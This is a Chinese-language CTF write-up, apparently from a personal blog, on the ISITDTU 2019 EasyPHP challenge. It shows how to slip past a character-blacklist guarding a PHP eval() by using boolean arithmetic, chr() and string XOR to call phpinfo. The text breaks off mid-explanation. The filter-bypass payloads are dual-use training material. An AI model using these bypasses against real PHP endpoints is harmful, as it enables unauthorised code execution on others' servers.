<!doctype html><html lang=en-us>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<link rel=manifest href=/manifest.json><meta name=description content="在 ISITDTU CTF 2019 上做了一道比较有意思的代码审计题，主要应用了 php 异或等操作进行 getshell，收获还是挺多的。最近越来越喜欢看这种代码简单，但是又蕴含玄机的东西了&amp;hellip;
"><title>ISITDTU CTF 2019 EasyPHP 回顾</title>
<link rel=canonical href=https://blog.zeddyu.info/2019/07/20/isitdtu-2019/>
<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="ISITDTU CTF 2019 EasyPHP 回顾">
<meta property="og:description" content="在 ISITDTU CTF 2019 上做了一道比较有意思的代码审计题，主要应用了 php 异或等操作进行 getshell，收获还是挺多的。最近越来越喜欢看这种代码简单，但是又蕴含玄机的东西了&amp;hellip;
">
<meta property="og:url" content="https://blog.zeddyu.info/2019/07/20/isitdtu-2019/">
<meta property="og:site_name" content="Zeddy's Blog">
<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:published_time" content="2019-07-20T01:22:26+00:00"><meta property="article:modified_time" content="2019-07-20T01:22:26+00:00">
<meta name=twitter:site content="@ZeddYu_Lu">
<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="ISITDTU CTF 2019 EasyPHP 回顾">
<meta name=twitter:description content="在 ISITDTU CTF 2019 上做了一道比较有意思的代码审计题，主要应用了 php 异或等操作进行 getshell，收获还是挺多的。最近越来越喜欢看这种代码简单，但是又蕴含玄机的东西了&amp;hellip;
">
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-112937997-1','auto'),ga('send','pageview'))</script>
</head>
<body class="article-page has-toc">
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex
extended">
<div id=article-toolbar>
<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
<span>Back</span>
</a>
</div>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>
CTF
</a>
</header>
<h2 class=article-title>
<a href=/2019/07/20/isitdtu-2019/>ISITDTU CTF 2019 EasyPHP 回顾</a>
</h2>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Jul 20, 2019</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
5 minute read
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<p>在 ISITDTU CTF 2019 上做了一道比较有意思的代码审计题，主要应用了 php 异或等操作进行 getshell，收获还是挺多的。最近越来越喜欢看这种代码简单，但是又蕴含玄机的东西了&mldr;</p>
<h1 id=description>Description</h1>
<blockquote>
<p>​ Don&rsquo;t try to run any Linux command, just use all the PHP functions you know to get the flag</p>
</blockquote>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>

<span class=nv>$_</span> <span class=o>=</span> <span class=o>@</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;_&#39;</span><span class=p>];</span>
<span class=k>if</span> <span class=p>(</span> <span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/[\x00- 0-9\&#39;&#34;`$&amp;.,|[{_defgops\x7F]+/i&#39;</span><span class=p>,</span> <span class=nv>$_</span><span class=p>)</span> <span class=p>)</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;rosé will not do it&#39;</span><span class=p>);</span>

<span class=k>if</span> <span class=p>(</span> <span class=nx>strlen</span><span class=p>(</span><span class=nx>count_chars</span><span class=p>(</span><span class=nx>strtolower</span><span class=p>(</span><span class=nv>$_</span><span class=p>),</span> <span class=mh>0x3</span><span class=p>))</span> <span class=o>&gt;</span> <span class=mh>0xd</span> <span class=p>)</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;you are so close, omg&#39;</span><span class=p>);</span>

<span class=k>eval</span><span class=p>(</span><span class=nv>$_</span><span class=p>);</span>
<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><h1 id=write-up>Write Up</h1>
<h2 id=explation>Explation</h2>
<p>题目代码比较简单，首先看看第一个正则：</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190711014316.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190711014316.png loading=lazy>
</a>
</figure></p>
<p>再看看第二个过滤，<code>strtolower</code>将字符串转换为小写，用<code>count_chars</code>返回由所有使用了的字节值组成的字符串，再判断其中每个字符累计出现次数是否大于 13</p>
<h2 id=doing>Doing</h2>
<h3 id=step-1>Step 1</h3>
<p>既然正则约束了比较多的条件，自然我们首先得看看还有哪些可用的。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span> 
<span class=nv>$arr</span> <span class=o>=</span> <span class=nx>get_defined_functions</span><span class=p>()[</span><span class=s1>&#39;internal&#39;</span><span class=p>];</span>

<span class=k>foreach</span> <span class=p>(</span><span class=nv>$arr</span> <span class=k>as</span> <span class=nv>$key</span> <span class=o>=&gt;</span> <span class=nv>$value</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span> <span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/[\x00- 0-9\&#39;&#34;`$&amp;.,|[{_defgops\x7F]+/i&#39;</span><span class=p>,</span> <span class=nv>$value</span><span class=p>)</span> <span class=p>){</span>
        <span class=nx>unset</span><span class=p>(</span><span class=nv>$arr</span><span class=p>[</span><span class=nv>$key</span><span class=p>]);</span>
        <span class=k>continue</span><span class=p>;</span>
    <span class=p>}</span>

    <span class=k>if</span> <span class=p>(</span> <span class=nx>strlen</span><span class=p>(</span><span class=nx>count_chars</span><span class=p>(</span><span class=nx>strtolower</span><span class=p>(</span><span class=nv>$value</span><span class=p>),</span> <span class=mh>0x3</span><span class=p>))</span> <span class=o>&gt;</span> <span class=mh>0xd</span> <span class=p>){</span>
        <span class=nx>unset</span><span class=p>(</span><span class=nv>$arr</span><span class=p>[</span><span class=nv>$key</span><span class=p>]);</span>
        <span class=k>continue</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span>

<span class=nx>var_dump</span><span class=p>(</span><span class=nv>$arr</span><span class=p>);</span>
<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><p>得到还剩下以下内置函数可用：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>array</span><span class=p>(</span><span class=mi>15</span><span class=p>)</span> <span class=p>{</span>
  <span class=p>[</span><span class=mi>206</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span> <span class=s2>&#34;bcmul&#34;</span>
  <span class=p>[</span><span class=mi>1060</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span> <span class=s2>&#34;rtrim&#34;</span>
  <span class=p>[</span><span class=mi>1066</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=s2>&#34;trim&#34;</span>
  <span class=p>[</span><span class=mi>1067</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span> <span class=s2>&#34;ltrim&#34;</span>
  <span class=p>[</span><span class=mi>1078</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=s2>&#34;chr&#34;</span>
  <span class=p>[</span><span class=mi>1102</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=s2>&#34;link&#34;</span>
  <span class=p>[</span><span class=mi>1103</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=s2>&#34;unlink&#34;</span>
  <span class=p>[</span><span class=mi>1146</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=s2>&#34;tan&#34;</span>
  <span class=p>[</span><span class=mi>1149</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=s2>&#34;atan&#34;</span>
  <span class=p>[</span><span class=mi>1150</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span> <span class=s2>&#34;atanh&#34;</span>
  <span class=p>[</span><span class=mi>1154</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=s2>&#34;tanh&#34;</span>
  <span class=p>[</span><span class=mi>1255</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=s2>&#34;intval&#34;</span>
  <span class=p>[</span><span class=mi>1403</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=s2>&#34;mail&#34;</span>
  <span class=p>[</span><span class=mi>1444</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=s2>&#34;min&#34;</span>
  <span class=p>[</span><span class=mi>1445</span><span class=p>]</span><span class=o>=&gt;</span>
  <span class=nx>string</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=s2>&#34;max&#34;</span>
<span class=p>}</span>
</code></pre></div><p>这样这题看起来与国赛那个 Love_Math 题目就有点类似了，看起来<code>intval</code>跟<code>chr</code>貌似有点搞头，但是数字却又被 ban 掉了…那我们就只能另寻他路了&mldr;</p>
<h3 id=step-2>Step 2</h3>
<p>虽然双引号跟单引号都被 ban 掉了，但是我们知道 php 在获取 HTTP GET 参数的时候默认是获得到了字符串类型，所以即使双引号跟单引号被 ban 了其实并没有太大的影响。而我们还可以知道，字符串还可以用<code>!</code>操作符来进行布尔类型的转换，如下：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=o>!</span><span class=nx>a</span><span class=p>);</span>
<span class=nx>PHP</span> <span class=nx>Notice</span><span class=o>:</span>  <span class=k>Use</span> <span class=nx>of</span> <span class=nx>undefined</span> <span class=nx>constant</span> <span class=nx>a</span> <span class=o>-</span> <span class=nx>assumed</span> <span class=s1>&#39;a&#39;</span> <span class=nx>in</span> <span class=nx>php</span> <span class=nx>shell</span> <span class=nx>code</span> <span class=nx>on</span> <span class=nx>line</span> <span class=mi>1</span>
<span class=nx>bool</span><span class=p>(</span><span class=k>false</span><span class=p>)</span>
<span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=o>!!</span><span class=nx>a</span><span class=p>);</span>
<span class=nx>PHP</span> <span class=nx>Notice</span><span class=o>:</span>  <span class=k>Use</span> <span class=nx>of</span> <span class=nx>undefined</span> <span class=nx>constant</span> <span class=nx>a</span> <span class=o>-</span> <span class=nx>assumed</span> <span class=s1>&#39;a&#39;</span> <span class=nx>in</span> <span class=nx>php</span> <span class=nx>shell</span> <span class=nx>code</span> <span class=nx>on</span> <span class=nx>line</span> <span class=mi>1</span>
<span class=nx>bool</span><span class=p>(</span><span class=k>true</span><span class=p>)</span>
</code></pre></div><p>可以再加一个<code>@</code>忽略 notice 输出</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=nx>var_dump</span><span class=p>(</span><span class=o>@</span><span class=nx>a</span><span class=p>);</span>		<span class=c1>//string(1) &#34;a&#34;
</span><span class=c1></span><span class=nx>var_dump</span><span class=p>(</span><span class=o>!@</span><span class=nx>a</span><span class=p>);</span>	<span class=c1>//bool(false)
</span><span class=c1></span><span class=nx>var_dump</span><span class=p>(</span><span class=o>!!@</span><span class=nx>a</span><span class=p>);</span>	<span class=c1>//bool(true)
</span></code></pre></div><p>而对 bool 类型使用加法的时候， php 则会将 bool 类型处理为数字，<code>true</code> 转换为 1 ， <code>false</code> 为 0 ，所以我们又可以利用这一点来实现数字计算：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=nx>var_dump</span><span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>);</span>	<span class=c1>//int(2) 1+1
</span><span class=c1></span><span class=nx>var_dump</span><span class=p>((</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>));</span>	<span class=c1>//int(6) (1+1)*(1+1+0+1)
</span></code></pre></div><p>所以，这样大概我们就可以利用<code>chr()</code>进行数字转换得到字符了，并且我们还可以利用<code>"phpinfo"()</code>的特性，通过字符串拼凑，可以得到 phpinfo:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=p>(</span><span class=nx>chr</span><span class=p>((</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span>  <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>))</span>
<span class=o>.</span><span class=nx>chr</span><span class=p>((</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span>  <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span>  <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=p>))</span>
<span class=o>.</span><span class=nx>chr</span><span class=p>((</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span>  <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>))</span>
<span class=o>.</span><span class=nx>chr</span><span class=p>((</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span>  <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span>  <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=p>)</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span>
<span class=o>.</span><span class=nx>chr</span><span class=p>((</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>*</span> <span class=p>((</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span>  <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=p>))</span>
<span class=o>.</span><span class=nx>chr</span><span class=p>((</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span>  <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span>  <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=p>)</span> <span class=o>-</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>-</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span>
<span class=o>.</span><span class=nx>chr</span><span class=p>((</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span>  <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>-</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>))();</span>
</code></pre></div><p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190713013742.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190713013742.jpg loading=lazy>
</a>
</figure></p>
<p>但是这里要需要用到<code>.</code>进行字符串拼接，然而<code>.</code>又被 ban 掉了，所以我们得另寻他路</p>
<h3 id=step-3>Step 3</h3>
<p>观察正则表达式，我们还可以使用的符号有：</p>
<pre tabindex=0><code>['!', '%', '+', '-', '*', '/', '&gt;', '&lt;', '?', '=', ':', '@', '^']
</code></pre><p>我们可以注意到另一个比较明显的点，就是<code>^</code>异或符号没有被 ban ，在一些免杀马里面就经常用<code>^</code>异或来进行混淆。通过查阅<a class=link href=https://www.php.net/manual/zh/language.operators.bitwise.php target=_blank rel=noopener> php文档</a> 我们可以知道</p>
<blockquote>
<p>​ If both operands for the <em>&</em>, <em>|</em> and <em>^</em> operators are strings, then the operation will be performed on the ASCII values of the characters that make up the strings and the result will be a string. In all other cases, both operands will be<a class=link href=https://www.php.net/manual/zh/language.types.integer.php#language.types.integer.casting target=_blank rel=noopener>converted to integers</a> and the result will be an integer.</p>
</blockquote>
<p>字符串的异或操作是基于字符的 ASCII 码来进行操作的，例如：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=o>@</span><span class=nx>a</span><span class=o>^</span><span class=s2>&#34;1&#34;</span><span class=p>);</span>
<span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;P&#34;</span>
<span class=nx>php</span> <span class=o>&gt;</span> <span class=k>echo</span> <span class=nx>ord</span><span class=p>(</span><span class=s2>&#34;a&#34;</span><span class=p>);</span>
<span class=mi>97</span>
<span class=nx>php</span> <span class=o>&gt;</span> <span class=k>echo</span> <span class=nx>ord</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>);</span>
<span class=mi>49</span>
<span class=nx>php</span> <span class=o>&gt;</span> <span class=k>echo</span> <span class=mi>97</span><span class=o>^</span><span class=mi>49</span><span class=p>;</span>
<span class=mi>80</span>
<span class=nx>php</span> <span class=o>&gt;</span> <span class=k>echo</span> <span class=nx>chr</span><span class=p>(</span><span class=mi>80</span><span class=p>);</span>
<span class=nx>P</span>
</code></pre></div><p>我们就可以利用之前的数字操作加上异或就可以得到我们自己想要的操作了。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=o>@</span><span class=nx>p</span><span class=o>^</span><span class=s2>&#34;1&#34;</span><span class=p>);</span>
<span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;A&#34;</span>
<span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=o>@</span><span class=nx>h</span><span class=o>^</span><span class=s2>&#34;1&#34;</span><span class=p>);</span>
<span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;Y&#34;</span>
<span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=o>@</span><span class=nx>i</span><span class=o>^</span><span class=s2>&#34;1&#34;</span><span class=p>);</span>
<span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;X&#34;</span>
<span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=o>@</span><span class=nx>n</span><span class=o>^</span><span class=s2>&#34;4&#34;</span><span class=p>);</span>
<span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;Z&#34;</span>
<span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=o>@</span><span class=nx>f</span><span class=o>^</span><span class=s2>&#34;1&#34;</span><span class=p>);</span>
<span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;W&#34;</span>
<span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=o>@</span><span class=nx>o</span><span class=o>^</span><span class=s2>&#34;5&#34;</span><span class=p>);</span>
<span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;Z&#34;</span>
<span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=o>@</span><span class=nx>phpinfo</span><span class=o>^</span><span class=s2>&#34;1111415&#34;</span><span class=p>);</span>
<span class=nx>string</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span> <span class=s2>&#34;AYAXZWZ&#34;</span>
<span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=o>@</span><span class=nx>AYAXZWZ</span><span class=o>^</span><span class=s2>&#34;1111415&#34;</span><span class=p>);</span>
<span class=nx>string</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span> <span class=s2>&#34;phpinfo&#34;</span>
